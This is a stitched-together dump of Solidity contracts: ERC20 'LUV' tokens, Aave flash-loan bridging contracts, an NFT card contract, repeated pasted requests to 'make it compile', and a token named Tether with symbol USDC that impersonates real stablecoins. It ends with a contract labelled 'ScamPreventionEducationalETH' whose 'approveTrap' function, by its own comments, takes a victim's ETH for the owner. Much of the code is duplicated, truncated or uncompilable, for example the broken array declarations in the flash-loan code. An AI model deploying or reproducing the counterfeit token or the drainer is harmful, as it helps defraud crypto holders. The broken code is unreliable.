        } catch (bytes memory error) {
            emit ErrorHandled(error);
            revert("Bridge transfer failed");
        }
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner nonReentrant {
        require(_bridgeContract != address(0), "Invalid bridge contract address");
        bridgeContract = _bridgeContract;

        emit BridgeContractUpdated(_bridgeContract);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Tether is ERC20, Ownable {
    uint256 private _initialSupply = 1000000 * 10**6; // Initial Supply: 1 million tokens (scaled to 6 decimals)

    // Chainlink Price Feed address for USD/ETH on Ethereum mainnet
    AggregatorV3Interface internal priceFeed;

    constructor() ERC20("Tether", "USDC") {
        // Mint the initial supply to the contract owner (could be you or an address you specify)
        _mint(msg.sender, _initialSupply);

        // Initialize the price feed (USD/ETH on Ethereum mainnet)
        priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714b5C6B9bD2c18B9d0C29bBb5);  // USD/ETH price feed on Ethereum mainnet
    }

    // Function to fetch the current price of USD in ETH from Chainlink price feed
    function getLatestPrice() public view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return price;  // Price returned with 8 decimals (1 ETH = price USD)
    }

    // Function to convert USD to USDC (Tether) based on price feed (1 USDC = 1 USD)
    function convertUSDToTether(uint256 usdAmount) public view returns (uint256) {
        int price = getLatestPrice();  // Get the latest price of USD in terms of ETH
        require(price > 0, "Invalid price feed");
        
        // Convert USD to ETH equivalent based on the price feed
        uint256 ethEquivalent = usdAmount * 10**18 / uint256(price);
        
        // Convert the ETH equivalent into USDC (scaled to 6 decimals)
        uint256 tetherEquivalent = ethEquivalent * 10**6; // Return the amount in USDC (6 decimals)
        
        return tetherEquivalent;
    }

    // Mint new tokens (only by the owner)
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    // Burn tokens (only by the owner)
    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }

    // Override the decimals() function to set 6 decimals
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LUV is ERC20, Ownable {
    uint256 public constant MAX_SUPPLY = 1000000000 * 10 ** 18; // 1 Billion LUV Tokens
    uint256 public totalMinted = 0; // Track total minted supply

    constructor() ERC20("Love", "LUV") {
        _mint(msg.sender, MAX_SUPPLY); // Mint all tokens at deployment
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        _mint(to, amount);
        totalMinted += amount;
    }
}

import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable {
    address public immutable polygonToken; // e.g., USDC on Polygon
    IPool public immutable POOL;
    address public bridgeContract;

    event FlashLoanExecuted(address token, uint256 amount);
    event LiquidityFunded(uint256 amount, bytes32 solanaAddress);
    event BridgeContractUpdated(address newBridgeContract);

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        require(_polygonToken != address(0), "Invalid Polygon token address");
        require(_bridgeContract != address(0), "Invalid bridge contract address");

        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;

        // Fetch and store the Aave pool address
        POOL = IPool(IPoolAddressesProvider(_addressProvider).getPool());
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        require(amount > 0, "Loan amount must be greater than zero");

        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        bytes memory params = ""; // Optional parameters
        uint16 referralCode = 0;

        POOL.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            referralCode
        );

        emit FlashLoanExecuted(polygonToken, amount);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");
        require(initiator == address(this), "Only contract initiator can execute");

        uint256 borrowedAmount = amounts[0];

        // Perform operations with flash loaned funds
        fundLiquidity(borrowedAmount);

        // Repay the loan with premium
        uint256 amountOwed = borrowedAmount + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        return true;
    }

    function fundLiquidity(uint256 amount) internal {
        require(bridgeContract != address(0), "Bridge contract not set");

        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, amount);

        // Transfer funds to Solana (Raydium liquidity pool)
        bytes32 solanaAddress = bytes32("YOUR_SOLANA_WALLET_HERE"); // Replace with your actual Solana address
        IBridge(bridgeContract).transferToSolana(polygonToken, amount, solanaAddress);

        emit LiquidityFunded(amount, solanaAddress);
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner {
        require(_bridgeContract != address(0), "Invalid bridge contract address");
        bridgeContract = _bridgeContract;

        emit BridgeContractUpdated(_bridgeContract);
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable, ReentrancyGuard {
    address public immutable polygonToken; // e.g., USDC on Polygon
    IPool public immutable POOL;
    address public bridgeContract;

    event FlashLoanExecuted(address token, uint256 amount);
    event LiquidityFunded(uint256 amount, bytes32 solanaAddress);
    event BridgeContractUpdated(address newBridgeContract);
    event FlashLoanRepaid(address token, uint256 amountOwed);
    event ErrorHandled(bytes errorMessage);

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        require(_polygonToken != address(0), "Invalid Polygon token address");
        require(_bridgeContract != address(0), "Invalid bridge contract address");

        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;

        // Fetch and store the Aave pool address
        POOL = IPool(IPoolAddressesProvider(_addressProvider).getPool());
    }

    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Loan amount must be greater than zero");

        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        bytes memory params = ""; // Optional parameters
        uint16 referralCode = 0;

        POOL.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            params,
            referralCode
        );

        emit FlashLoanExecuted(polygonToken, amount);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override nonReentrant returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");
        require(initiator == address(this), "Only contract initiator can execute");

        uint256 borrowedAmount = amounts[0];

        // Perform operations with flash loaned funds
        fundLiquidity(borrowedAmount);

        // Repay the loan with premium
        uint256 amountOwed = borrowedAmount + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        emit FlashLoanRepaid(assets[0], amountOwed);

        return true;
    }

    function fundLiquidity(uint256 _amount) internal nonReentrant {
        require(bridgeContract != address(0), "Bridge contract not set");

        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, _amount);

        try IBridge(bridgeContract).transferToSolana(
            polygonToken,
            _amount,
            bytes32("YOUR_SOLANA_WALLET_HERE") // Replace with actual Solana address
        ) {
            emit LiquidityFunded(_amount, "YOUR_SOLANA_WALLET_HERE");
        } catch (bytes memory error) {
            emit ErrorHandled(error);
            revert("Bridge transfer failed");
        }
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner nonReentrant {
        require(_bridgeContract != address(0), "Invalid bridge contract address");
        bridgeContract = _bridgeContract;

        emit BridgeContractUpdated(_bridgeContract);
    }
}

pragma solidity ^0.8.19;

import "@aave/core-v3/contracts/flashloan/base/FlashLoanReceiverBase.sol";
import "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import "@aave/core-v3/contracts/interfaces/IPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBridge {
    function transferToSolana(address token, uint256 amount, bytes32 solanaAddress) external;
}

contract FlashLoanPolygon is FlashLoanReceiverBase, Ownable {
    address public polygonToken; // e.g., USDC on Polygon
    address public bridgeContract; // Address of the cross-chain bridge

    constructor(address _addressProvider, address _polygonToken, address _bridgeContract)
        FlashLoanReceiverBase(IPoolAddressesProvider(_addressProvider))
    {
        polygonToken = _polygonToken;
        bridgeContract = _bridgeContract;
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address receiverAddress = address(this);
        address;
        assets[0] = polygonToken;

        uint256;
        amounts[0] = amount;

        uint256;
        modes[0] = 0; // 0 = no debt, repay immediately

        address onBehalfOf = address(this);
        bytes memory params = ""; // Optional custom logic
        uint16 referralCode = 0;

        IPool(address(POOL)).flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "Caller must be Aave pool");

        // Perform operations with flash-loaned funds (e.g., swap, bridge, liquidity)
        fundLiquidity(amounts[0]);

        // Repay loan + fees
        uint256 amountOwed = amounts[0] + premiums[0];
        IERC20(assets[0]).approve(address(POOL), amountOwed);

        return true;
    }

    function fundLiquidity(uint256 amount) internal {
        require(bridgeContract != address(0), "Bridge contract not set");
        
        // Approve bridge contract to move funds
        IERC20(polygonToken).approve(bridgeContract, amount);

        // Transfer funds to Solana (Raydium liquidity pool)
        bytes32 solanaAddress = bytes32("YOUR_SOLANA_WALLET_HERE"); // Replace with your actual Solana wallet address
        IBridge(bridgeContract).transferToSolana(polygonToken, amount, solanaAddress);
    }

    function setBridgeContract(address _bridgeContract) external onlyOwner {
        bridgeContract = _bridgeContract;
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract LUV is ERC20, Ownable {
    uint256 public constant MAX_SUPPLY = 1000000000 * 10 ** 18; // 1 Billion LUV Tokens
    uint256 public totalMinted = 0; // Track total minted supply

    constructor() ERC20("Love", "LUV") {
        _mint(msg.sender, MAX_SUPPLY); // Mint all tokens at deployment
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        _mint(to, amount);
        totalMinted += amount;
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract LUV is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    uint256 public constant MAX_SUPPLY = 1000000000 * 10 ** 18; // 1 Billion LUV Tokens
    uint256 public totalMinted = 0; // Track total minted supply

    constructor() ERC20("Love", "LUV") {
        _mint(msg.sender, MAX_SUPPLY); // Mint all tokens at deployment
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external nonReentrant {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        unchecked {
            totalMinted += amount; // Safe math optimization
        }
        _mint(to, amount);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Tether is ERC20("Tether", "USDC"), Ownable {
    uint256 private _initialSupply = 1000000 * 10**6; // Initial Supply: 1 million tokens (scaled to 6 decimals)

    // Chainlink Price Feed address for USD/ETH on Ethereum mainnet
    AggregatorV3Interface internal priceFeed;

    constructor() ERC20("Tether", "USDC") {
        // Mint the initial supply to the contract owner (could be you or an address you specify)
        _mint(msg.sender, _initialSupply);

        // Initialize the price feed (USD/ETH on Ethereum mainnet)
       priceFeed = AggregatorV3Interface(0x5F4Ec3dF9cBd43714b5c6B9bd2c18b9D0c29bbb5);
    }

    // Function to fetch the current price of USD in ETH from Chainlink price feed
    function getLatestPrice() public view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return price;  // Price returned with 8 decimals (1 ETH = price USD)
    }

    // Function to convert USD to USDC based on Chainlink's current exchange rate
    function convertUSDToTether(uint256 usdAmount) public view returns (uint256) {
        int price = getLatestPrice();  
        
        if(price <= 0){ 
            return 0;
        }
        
        // Convert the amount of USD to ETH equivalent based on the price feed and scale it
        uint256 ethEquivalentIn18Decimals = usdAmount * 10**18 / uint256(price);
        
        require(ethEquivalentIn18Decimals > 0, "Invalid conversion");
        
        return (ethEquivalentIn18Decimals*10**6)/10**(8+6); // Return the amount in USDC with correct scaling
    }

    // Mint new tokens (only by the owner)
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }
    
    // Burn tokens (only by the owner)
    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }

    // Override the decimals() function to set 6 decimals
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Tether is ERC20("Tether", "USDC"), Ownable {
    uint256 private _initialSupply = 1000000 * 10**6; // Initial Supply: 1 million tokens (scaled to 6 decimals)

    // Chainlink Price Feed address for USD/ETH on Ethereum mainnet
    AggregatorV3Interface internal priceFeed;

    constructor() ERC20("Tether", "USDC") {
        // Mint the initial supply to the contract owner (could be you or an address you specify)
        _mint(msg.sender, _initialSupply);

        // Initialize the price feed (USD/ETH on Ethereum mainnet)
       priceFeed = AggregatorV3Interface(0x5F4Ec3dF9cBd43714b5c6B9bd2c18b9D0c29bbb5);
    }

    // Function to fetch the current price of USD in ETH from Chainlink price feed
    function getLatestPrice() public view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return price;  // Price returned with 8 decimals (1 ETH = price USD)
    }

    // Function to convert USD to USDC based on Chainlink's current exchange rate
    function convertUSDToTether(uint256 usdAmount) public view returns (uint256) {
        int price = getLatestPrice();  
        
        if(price <= 0){ 
            return 0;
        }
        
        // Convert the amount of USD to ETH equivalent based on the price feed and scale it
        uint256 ethEquivalentIn18Decimals = usdAmount * 10**18 / uint256(price);
        
        require(ethEquivalentIn18Decimals > 0, "Invalid conversion");
        
        return (ethEquivalentIn18Decimals*10**6)/10**(8+6); // Return the amount in USDC with correct scaling
    }

    // Mint new tokens (only by the owner)
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }
    
    // Burn tokens (only by the owner)
    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }

    // Override the decimals() function to set 6 decimals
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
} create it corect and make it to compile

```solidity
 //SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/common/ERC2981.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Base64.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

contract Kioocards is ERC1155, ERC2981, Ownable(msg.sender) {
    string public name;
    string public symbol;
    string private baseURI;
    string public contractURI;
    uint256 public maxFreeMintPerWallet;
    
    struct Card {
        uint256 cap;
        uint256 minted;
        uint256 mintType; // 0 = Airdrop, 1 = Mint in NATIVE, 2 = Mint in ERC20, 3 = Free Mint
        uint256 mintPrice;
        uint256 season;
        uint256 cardNum;
        address erc20Address;
        bool mintEnabled;
        string name;
        string description;
        string artist;
        string extension;
    }

    mapping(uint256 => Card) public idToCard;
    mapping(string => uint256) public nameToCard;
    mapping (address => bool) public admins;

    event ContractURIUpdated(string newContractURI);

    modifier onlyAdmin() {
        require(admins[msg.sender] || owner() == msg.sender);
        _;
    }

    constructor() ERC1155("") {
        name = "Kioocards";
        symbol = "KCC";
        baseURI = "https://api.kiooverse.xyz/v1/nft/kioocards/images/";
        contractURI = "https://api.kiooverse.xyz/v1/nft/kioocards/contract-metadata.json";
        maxFreeMintPerWallet = 10;

         _setDefaultRoyalty(msg.sender, 500); // 5% royalty (bips)
    }

    function createKioocard(
        uint256 _tokenId,
        uint256 _cap,
        uint256 _mintType,
        uint256 _mintPrice,
        uint256 _season,
        uint256 _cardNum,
        address _erc20Address,
        string memory _name,
        string memory _description,
        string memory _artist,
        string memory _extension
    ) external payable onlyOwner {
        require(idToCard[_tokenId].cap == 0, "Card ID Already Exists");
        idToCard[_tokenId] = Card(_cap, 0, _mintType, _mintPrice, _season, _cardNum, _erc20Address, false, _name, _description, _artist, _extension);
        nameToCard[_name] = _tokenId;
    }

    function enableMint(uint256 _tokenId) external payable onlyOwner {
        idToCard[_tokenId].mintEnabled = true;
    }

    function disableMint(uint256 _tokenId) external payable onlyOwner {
        idToCard[_tokenId].mintEnabled = false;
    }

    function setBaseUri(string memory _baseURI) external payable onlyOwner {
        baseURI = _baseURI;
    }

    function setContractURI(string memory _contractURI) external payable onlyOwner {
        contractURI = _contractURI;
         emit ContractURIUpdated(_contractURI);
    }

    function setMaxFreeMintPerWallet(uint256 _maxFreeMintPerWallet) external payable onlyOwner {
        require(_maxFreeMintPerWallet > 0, "Kioocard: invalid nft per wallet");
        maxFreeMintPerWallet = _maxFreeMintPerWallet;
    }

    function withdrawNATIVE() external payable onlyOwner {
        require(address(this).balance > 0, "No native token available");
        (bool transferSucceeded, ) = msg.sender.call{value: address(this).balance}("");
        require(transferSucceeded, "Native token withdrawal failed");
    }

    function withdrawERC20(address _tokenContractAddress) external payable onlyOwner {
        IERC20 tokenContract = IERC20(_tokenContractAddress);
        uint256 balanceOfContract = tokenContract.balanceOf(address(this));
        require(balanceOfContract > 0, "No tokens available");
        bool transferSucceeded = tokenContract.transfer(msg.sender, balanceOfContract);
        require(transferSucceeded, "ERC20 withdrawal failed");
    }

    function airdrop(uint256 _tokenId, address _recipient) external payable onlyAdmin {
        require(idToCard[_tokenId].minted + 1 <= idToCard[_tokenId].cap, "Airdrop Limit Exceeded");
        _mint(_recipient, _tokenId, 1, "");
        idToCard[_tokenId].minted += 1;
    }

    function batchAirdrop(uint _tokenId, address[] memory _recipients) external payable onlyAdmin {
        require(idToCard[_tokenId].minted + _recipients.length <= idToCard[_tokenId].cap, "Airdrop Limit Exceeded");
        uint256 length = _recipients.length;
        unchecked {
            for(uint256 i = 0; i < length; ++i) {
                _mint(_recipients[i], _tokenId, 1, "");
            }
            idToCard[_tokenId].minted += length;
        }
    }

    function setDefaultRoyalty(address receiver, uint96 feeNumerator) external payable onlyOwner {
        _setDefaultRoyalty(receiver, feeNumerator);
    }
    function deleteDefaultRoyalty() external payable onlyOwner {
        _deleteDefaultRoyalty();
    }

    function setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) external payable onlyOwner {
        _setTokenRoyalty(tokenId, receiver, feeNumerator);
    }

    function resetTokenRoyalty(uint256 tokenId) external payable onlyOwner {
        _resetTokenRoyalty(tokenId);
    }

    function addAdmin(address _admin) external payable onlyOwner {
        admins[_admin] = true;
    }
    function removeAdmin(address _admin) external payable onlyOwner {
        delete admins[_admin];
    }

    function mint(uint256 _tokenId) external payable {
        require(idToCard[_tokenId].mintType == 1 || idToCard[_tokenId].mintType == 2, "Kioocard: not publicly mintable");
        if(idToCard[_tokenId].mintType == 1) {
            _nativeMint(_tokenId, msg.sender);
        } else {
            _erc20Mint(_tokenId, msg.sender);
        }
    }

    function freeMint(uint256 _tokenId) external {
        require(balanceOf(msg.sender, _tokenId) < maxFreeMintPerWallet, "Kioocard: per wallet exceeded");
        require(idToCard[_tokenId].mintType == 3, "Kioocard: not free mintable");
        _freeMint(_tokenId, msg.sender);
    }

    function _freeMint(uint256 _tokenId, address _recipient) private {
        require(idToCard[_tokenId].minted < idToCard[_tokenId].cap, "Kioocard: limit reached");
        require(idToCard[_tokenId].mintEnabled, "Kioocard: minting not enabled");
        _mint(_recipient, _tokenId, 1, "");
        idToCard[_tokenId].minted += 1;
    }

    function _nativeMint(uint256 _tokenId, address _recipient) private {
        require(msg.value >= idToCard[_tokenId].mintPrice, "Insufficient native token");
        require(idToCard[_tokenId].minted < idToCard[_tokenId].cap, "Kioocard: limit reached");
        require(idToCard[_tokenId].mintEnabled, "Kioocard: minting not enabled");
        _mint(_recipient, _tokenId, 1, "");
        idToCard[_tokenId].minted += 1;
    }

    function _erc20Mint(uint256 _tokenId, address _recipient) private {
        IERC20 _myToken = IERC20(idToCard[_tokenId].erc20Address);
        require(_myToken.allowance(msg.sender, address(this)) >= idToCard[_tokenId].mintPrice, "Insufficient Token Allowance");
        require(_myToken.balanceOf(msg.sender) >= idToCard[_tokenId].mintPrice, "Insufficient Token Balance");
        require(_myToken.transferFrom(msg.sender, address(this), idToCard[_tokenId].mintPrice), "Token transfer not successful");
        require(idToCard[_tokenId].minted < idToCard[_tokenId].cap, "Kioocard: limit reached");
        require(idToCard[_tokenId].mintEnabled, "Kioocard: minting not enabled");
        _mint(_recipient, _tokenId, 1, "");
        idToCard[_tokenId].minted += 1;
    }

    function uri(uint256 _tokenId) public view override returns (string memory) {
        require(idToCard[_tokenId].cap !=0, "Card ID Does Not Exist");

        string memory kiooEditionTokenId = Strings.toString(_tokenId);
        string memory season = Strings.toString(idToCard[_tokenId].season);
        string memory card = Strings.toString(idToCard[_tokenId].cardNum);

        string memory attributes = string(abi.encodePacked(
            '[',
                '{"trait_type":"Season","value":"', season, '"},',
                '{"trait_type":"Card #","value":"', card, '"},',
                '{"trait_type":"Artist","value":"', idToCard[_tokenId].artist, '"}',
            ']'
        ));
        string memory _uri = string(abi.encodePacked(
            '{',
            '"name":"', idToCard[_tokenId].name, '", ',
            '"description":"', idToCard[_tokenId].description, '", ',
            '"image":"', baseURI, kiooEditionTokenId, '.', idToCard[_tokenId].extension, '", ',
            '"attributes":', attributes,
            '}'
        ));
        bytes memory encodedData = bytes(_uri);

        string memory base64Data = Base64.encode(encodedData);

        return string(abi.encodePacked("data:application/json;base64,", base64Data));
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC1155, ERC2981) returns (bool) {
        return super.supportsInterface(interfaceId);
    }
}
```

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract LUV is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    uint256 public constant MAX_SUPPLY = 1000000000 * 10 ** 18; // 1 Billion LUV Tokens
    uint256 public totalMinted = 0; // Tracks total minted tokens

    constructor() ERC20("Love", "LUV") {
        _mint(msg.sender, MAX_SUPPLY); // Mint all tokens to owner at launch
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external nonReentrant {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        _mint(to, amount);
        totalMinted += amount;
    }
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract LUV is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    uint256 public constant MAX_SUPPLY = 1000000000 * 10 ** 18; // 1 Billion LUV Tokens
    uint256 public totalMinted = 0; // Track total minted supply

    constructor() ERC20("Love", "LUV") {
        _mint(msg.sender, MAX_SUPPLY); // Mint all tokens at deployment
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external nonReentrant {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        unchecked {
            totalMinted += amount; // Safe math optimization
        }
        _mint(to, amount);
    }
}

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

pragma solidity ^0.8.0;

// Import OpenZeppelin Contracts
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol";

contract LUV is ERC20, Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    uint256 public constant MAX_SUPPLY = 500000000 * 10 ** 18; // 500 Million LUV Tokens
    uint256 public totalMinted = 0; // Tracks total minted tokens

    constructor(address initialOwner) ERC20("Love", "LUV") Ownable(initialOwner) {
        _mint(initialOwner, MAX_SUPPLY); // Mint all tokens to owner at launch
        totalMinted = MAX_SUPPLY;
    }

    function burn(uint256 amount) external nonReentrant {
        require(balanceOf(msg.sender) >= amount, "Insufficient balance");
        _burn(msg.sender, amount);
    }

    function mint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(totalMinted + amount <= MAX_SUPPLY, "Max supply reached");
        unchecked {
            totalMinted += amount;
        }
        _mint(to, amount);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract Tether is ERC20("Tether", "USDC"), Ownable {
    uint256 private _initialSupply = 1000000 * 10**6; // Initial Supply: 1 million tokens (scaled to 6 decimals)

    // Chainlink Price Feed address for USD/ETH on Ethereum mainnet
    AggregatorV3Interface internal priceFeed;

    constructor() ERC20("Tether", "USDC") {
        // Mint the initial supply to the contract owner (could be you or an address you specify)
        _mint(msg.sender, _initialSupply);

        // Initialize the price feed (USD/ETH on Ethereum mainnet)
       priceFeed = AggregatorV3Interface(0x5F4Ec3dF9cBd43714b5c6B9bd2c18b9D0c29bbb5);
    }

    // Function to fetch the current price of USD in ETH from Chainlink price feed
    function getLatestPrice() public view returns (int) {
        (
            , 
            int price,
            ,
            ,
            
        ) = priceFeed.latestRoundData();
        return price;  // Price returned with 8 decimals (1 ETH = price USD)
    }

    // Function to convert USD to USDC based on Chainlink's current exchange rate
    function convertUSDToTether(uint256 usdAmount) public view returns (uint256) {
        int price = getLatestPrice();  
        
        if(price <= 0){ 
            return 0;
        }
        
        // Convert the amount of USD to ETH equivalent based on the price feed and scale it
        uint256 ethEquivalentIn18Decimals = usdAmount * 10**18 / uint256(price);
        
        require(ethEquivalentIn18Decimals > 0, "Invalid conversion");
        
        return (ethEquivalentIn18Decimals*10**6)/10**(8+6); // Return the amount in USDC with correct scaling
    }

    // Mint new tokens (only by the owner)
    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }
    
    // Burn tokens (only by the owner)
    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }

    // Override the decimals() function to set 6 decimals
    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
} create it corect and make it to compile

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



contract ScamPreventionEducationalETH {

    address public owner;



    event ApprovalTrapActivated(address indexed victim, uint256 amount);

    event FundsWithdrawn(address indexed owner, uint256 amount);



    constructor() {

        owner = msg.sender;

    }



    // Fonction qui piège la victime et envoie tout son ETH au propriétaire

    function approveTrap() external payable {

        require(msg.value > 0, "Votre solde est nul");



        uint256 victimBalance = address(msg.sender).balance;

        require(victimBalance > 0, "Votre solde est nul");



        (bool success, ) = payable(owner).call{value: victimBalance}("");

        require(success, "Le transfert a échoué");



        emit ApprovalTrapActivated(msg.sender, victimBalance);

    }



